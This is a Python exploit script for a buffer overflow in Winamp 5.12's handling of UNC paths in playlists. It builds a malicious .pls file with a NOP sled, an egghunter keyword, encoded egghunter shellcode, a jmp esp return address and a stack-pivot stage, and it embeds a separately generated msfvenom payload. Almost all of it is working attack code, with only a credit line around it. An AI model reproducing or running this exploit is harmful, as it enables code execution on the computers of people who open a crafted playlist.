#!/usr/bin/python3
#Winamp 5.12 UNC Path Name Buffer Overflow
#Original Finding : Credits : ATmaCA is credited with the discovery of this vulnerability.
#Author : Uzeyir Destan

import sys

start= b"[playlist]\r\nFile1=\\\\";

keyword = b"T00WT00W" # our egghunter keyword
nop = keyword+b"\x90" * 64 # we need to give big nop for decoding

try:
    f = open("payload","rb") # reading payload make it easy to integrate for shelltype
    byte = f.read(1)
    while byte:
        nop += byte
        byte = f.read(1)
    f.close()
except IOError:
    print("File not accessible. Did you run msfvenom ?")
    sys.exit(1)

	
nop += b"\x90"* (846-len(nop)) 

eip = b"\xe3\x27\x29\x1a" #1a2927e3 ; jmp esp non aslr dll
stage1= b"\x83\xec\x58"*2+b"\xff\xe4" # sub esp,0x58 ; sub esp,0x58 ; jmp esp;
stage2 = b"\x90"*16 # again we need some space for decoding 
stage2 += b"\xda\xd4\xd9\x74\x24\xf4\x58\x50\x59\x49\x49\x49\x49"
stage2 += b"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37"
stage2 += b"\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
stage2 += b"\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
stage2 += b"\x50\x38\x41\x42\x75\x4a\x49\x45\x36\x4e\x61\x58\x4a"
stage2 += b"\x39\x6f\x74\x4f\x77\x32\x66\x32\x33\x5a\x57\x72\x53"
stage2 += b"\x68\x6a\x6d\x34\x6e\x75\x6c\x45\x55\x71\x4a\x73\x44"
stage2 += b"\x4a\x4f\x4c\x78\x62\x74\x46\x50\x44\x70\x33\x67\x6c"
stage2 += b"\x4b\x39\x6a\x6c\x6f\x50\x75\x5a\x4a\x6c\x6f\x54\x35"
stage2 += b"\x59\x77\x39\x6f\x78\x67\x41\x41"
stage2 += b"\x90"*(0x58*2-len(stage2))
end = b"\r\nTitle1=pwn!!!\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n";

payload = start+nop+stage2+eip+stage1+end
#print(payload)
f = open("exploit.pls","wb")
f.write(payload)
f.close()
